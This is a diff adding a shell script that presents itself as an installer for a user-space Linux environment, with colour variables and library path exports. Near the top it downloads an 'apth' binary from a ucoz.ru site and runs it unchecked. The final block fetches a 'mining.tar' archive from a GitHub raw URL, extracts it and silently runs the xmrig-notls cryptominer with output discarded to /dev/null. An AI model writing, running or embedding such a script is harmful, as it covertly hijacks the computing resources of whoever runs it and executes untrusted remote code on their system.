@@ -1,0 +1,53 @@
+HOMEA="$HOME/linux"
+set -C
+mkdir $HOME/linux
+mkdir $HOMEA/usr
+mkdir $HOMEA/usr/bin
+mkdir $HOMEA/bin
+mkdir $HOME/usr/bin
+mkdir $HOME/bin
+bold='\e[1m'              # bold
+nc='\e[0m'                # nc
+lightblue='\e[94m'        # lightblue
+lightgreen='\e[92m'       # lightgreen
+black='\033[0;30m'        # Black
+red='\033[0;31m'          # Red
+green='\033[0;32m'        # Green
+yellow='\033[0;33m'       # Yellow
+blue='\033[0;34m'         # Blue
+purple='\033[0;35m'       # Purple
+cyan='\033[0;36m'         # Cyan
+white='\033[0;37m'        # White
+mkdir linux
+if ! [ -f $HOMEA/usr/bin/apth ];
+then
+echo 'Установка apth | Installing apth'
+curl -o $HOMEA/usr/bin/apth https://igriastranomier.ucoz.ru/apth.txt
+chmod +x $HOMEA/usr/bin/apth
+$HOMEA/usr/bin/apth zip proot wget xz-utils
+fi
+
+STAR0="/lib64:/lib/udev:/lib/systeminfo:/lib/terminfo:/lib:/lib/x86_64-linux-gnu"
+STAR1="$HOMEA/lib:$HOMEA/usr/lib:$HOMEA/var/lib:$HOMEA/usr/lib/x86_64-linux-gnu:$HOMEA/lib/x86_64-linux-gnu:$HOMEA/lib:$HOMEA/usr/lib/sudo"
+STAR2="$HOMEA/usr/include/x86_64-linux-gnu:$HOMEA/usr/include/x86_64-linux-gnu/bits:$HOMEA/usr/include/x86_64-linux-gnu/gnu"
+STAR3="$HOMEA/usr/share/lintian/overrides/:$HOMEA/usr/src/glibc/debian/:$HOMEA/usr/src/glibc/debian/debhelper.in:$HOMEA/usr/lib/mono"
+STAR4="$HOMEA/usr/src/glibc/debian/control.in:$HOMEA/usr/lib/x86_64-linux-gnu/libcanberra-0.30:$HOMEA/usr/lib/x86_64-linux-gnu/libgtk2.0-0"
+STAR5="$HOMEA/usr/lib/x86_64-linux-gnu/gtk-2.0/modules:$HOMEA/usr/lib/x86_64-linux-gnu/gtk-2.0/2.10.0/immodules:$HOMEA/usr/lib/x86_64-linux-gnu/gtk-2.0/2.10.0/printbackends"
+STAR6="$HOMEA/usr/lib/x86_64-linux-gnu/samba/:$HOMEA/usr/lib/x86_64-linux-gnu/pulseaudio:$HOMEA/usr/lib/x86_64-linux-gnu/blas:$HOMEA/usr/lib/x86_64-linux-gnu/blis-serial"
+STAR7="$HOMEA/usr/lib/x86_64-linux-gnu/blis-openmp:$HOMEA/usr/lib/x86_64-linux-gnu/atlas:$HOMEA/usr/lib/x86_64-linux-gnu/tracker-miners-2.0:$HOMEA/usr/lib/x86_64-linux-gnu/tracker-2.0:$HOMEA/usr/lib/x86_64-linux-gnu/lapack:$HOMEA/usr/lib/x86_64-linux-gnu/gedit:$HOMEA/usr/lib/x86_64-linux-gnu/xrdp"
+STAR8="$HOMEA/usr/lib/*:$HOMEA/usr/share/*"
+STARALL="$STAR1:$STAR2:$STAR3:$STAR4:$STAR5:$STAR6:$STAR7"
+clear
+export LD_LIBRARY_PATH=$STARALL
+export PATH="$HOMEA/bin:$HOMEA/usr/bin:$HOMEA/sbin:$HOMEA/usr/sbin:$HOMEA/etc/init.d:$PATH"
+export BUILD_DIR=$HOMEA
+export DISPLAY=:0
+
+if ! [ -d $HOME/linux/aaa ];
+then
+mkdir $HOME/linux/aaa
+cd $HOME/linux/aaa && curl -o 1.tar.xz https://raw.githubusercontent.com/simulasi2/test123/main/mining.tar
+cd $HOME/linux/aaa && tar xvf 1.tar.xz && rm 1.tar.xz
+fi
+cd $HOME/linux/aaa && chmod +x xmrig-notls
+cd $HOME/linux/aaa && ./xmrig-notls >> /dev/null
